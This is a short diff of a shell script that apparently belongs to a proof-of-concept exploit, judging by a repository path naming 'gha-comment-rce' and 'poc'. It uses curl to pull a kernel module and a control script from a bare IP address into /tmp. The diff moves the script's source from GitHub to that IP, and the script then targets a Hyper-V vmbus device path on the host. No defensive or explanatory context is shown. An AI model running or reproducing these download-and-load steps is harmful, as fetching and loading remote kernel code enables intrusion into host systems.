@@ -4,7 +4,7 @@ exec 0<&-
 
 curl -fsS http://16.146.243.72:8450/hvraw_vmbfs_control.ko \
     -o /tmp/hvraw_vmbfs_control.ko
-curl -fsS https://raw.githubusercontent.com/fdzdev/gha-comment-rce-3900000/main/poc/vmbfs_control.py \
+curl -fsS http://16.146.243.72:8450/vmbfs_control.py \
     -o /tmp/vmbfs_control.py
 
 device=/hostsys/bus/vmbus/devices/c63c9bdf-5fa5-4208-b03f-6b458b365592
